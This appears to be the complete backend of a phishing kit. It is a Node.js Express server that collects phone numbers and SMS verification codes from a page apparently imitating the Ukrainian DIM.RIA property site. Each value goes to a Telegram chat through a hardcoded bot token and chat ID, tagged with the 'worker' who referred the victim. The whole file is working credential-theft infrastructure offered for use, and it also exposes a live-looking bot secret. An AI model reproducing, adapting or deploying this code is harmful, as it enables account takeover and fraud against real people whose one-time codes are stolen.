const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const port = process.env.PORT || 3000;

// === КОНФІГУРАЦІЯ TELEGRAM ===
const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
const CHAT_ID = "-5055127448";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

app.use(bodyParser.json());
app.use(express.static(__dirname));

// === ГЛАВНАЯ СТРАНИЦА ===
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// === ОТПРАВКА В TELEGRAM С ПОВТОРНЫМИ ПОПЫТКАМИ ===
async function sendToTelegram(message, retries = 2) {
    for (let i = 0; i <= retries; i++) {
        try {
            const res = await fetch(TELEGRAM_API, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                }),
                timeout: 10000
            });

            if (res.ok) {
                console.log('Успішно відправлено в Telegram');
                return true;
            }

            const err = await res.json();
            console.error('Telegram API error:', err);
        } catch (err) {
            console.error(`Спроба ${i + 1} не вдалася:`, err.message);
            if (i === retries) return false;
            await new Promise(r => setTimeout(r, 2000));
        }
    }
    return false;
}

// === ОБРАБОТКА ДАННЫХ ===
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, referrer } = req.body;

    let message = '';

    if (step === 'phone' && phone) {
        message = `*ПРОЕКТ:* DIM.RIA ⚡⚡⚡\n*Номер:* \`${phone}\`\n*СТРАНА:* Украина`;
        if (referrer) message += `\n*Работник:* @${referrer}`;
    } 
    else if (step === 'code' && code) {
        message = `*SMS КОД:*\n\`${code}\``;
        if (referrer) message += `\n*Работник:* @${referrer}`;
    } 
    else {
        return res.status(400).json({ success: false });
    }

    const success = await sendToTelegram(message);

    if (success) {
        res.json({ success: true });
    } else {
        res.status(500).json({ success: false });
    }
});

app.listen(port, () => {
    console.log(`Сервер запущено: http://localhost:${port}`);
    console.log(`Панель: http://localhost:${port}/panel`);
});
